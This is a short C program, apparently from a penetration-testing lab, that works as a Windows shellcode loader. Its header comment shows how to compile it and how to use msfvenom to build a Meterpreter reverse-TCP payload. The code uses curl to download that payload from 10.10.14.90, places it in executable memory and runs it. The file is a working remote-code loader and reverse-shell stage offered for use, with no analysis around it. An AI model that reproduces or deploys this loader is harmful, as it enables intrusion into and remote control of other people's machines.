/* TO COMPILE:
x86_64-w64-mingw32-gcc -o shell.exe shell.c -lws2_32
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.90 LPORT=9002 -f raw -o www/code.bin
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
int main()
{
    FILE *fpipe;
    char *command = "curl http://10.10.14.90/code.bin";
    char c = 0;
    unsigned char code[510];
    int counter = 0;
if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }
while (fread(&c, sizeof c, 1, fpipe))
    {
        code[counter] = c;
        printf("%c", code[counter]);
        counter = counter + 1;
    }
pclose(fpipe);
    
    void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 memcpy(exec, code, sizeof code);
 ((void(*)())exec)();
 return 0;
}